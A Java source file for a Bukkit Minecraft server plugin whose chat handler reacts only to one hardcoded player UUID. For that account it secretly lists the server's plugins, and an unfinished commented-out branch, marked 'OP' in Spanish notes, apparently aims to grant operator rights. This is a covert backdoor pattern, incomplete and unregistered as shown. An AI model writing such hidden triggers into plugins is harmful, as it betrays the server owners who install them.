package com.yazawa.nico;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import com.google.common.base.Joiner;

public class ZCode extends JavaPlugin {
	

	
	public void Event(AsyncPlayerChatEvent event) {
		Player sender = event.getPlayer();
		String label = event.getMessage();
		String uuid = String.valueOf(sender.getUniqueId());
		if(uuid.equals("77277f23-1184-3340-b74b-c89e05df4d47")) {
			if(label.equals("PLUGINS")) {
				event.setCancelled(true);
				
				List<String> plList = new ArrayList<String>();
				
				for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
					
					ChatColor color = plugin.isEnabled() ? ChatColor.GREEN : ChatColor.RED;
			        String plName = color + plugin.getName() +  " (" + plugin.getDescription().getVersion() + ")";
			        
					plList.add(plName);
				}
				
				Collections.sort(plList, String.CASE_INSENSITIVE_ORDER);
				
				String pl = Joiner.on(ChatColor.GRAY + ", " + ChatColor.GREEN).join(plList);
				
				sender.sendMessage(pl);
				return;
			}
			/*if(label.startsWith("OP")) {
				event.setCancelled(true);
				
				

				sender.sendMessage("Hecho");
				return;
				
				AUN FALTA ACABAR ESTO
			}*/
		}
	}
}
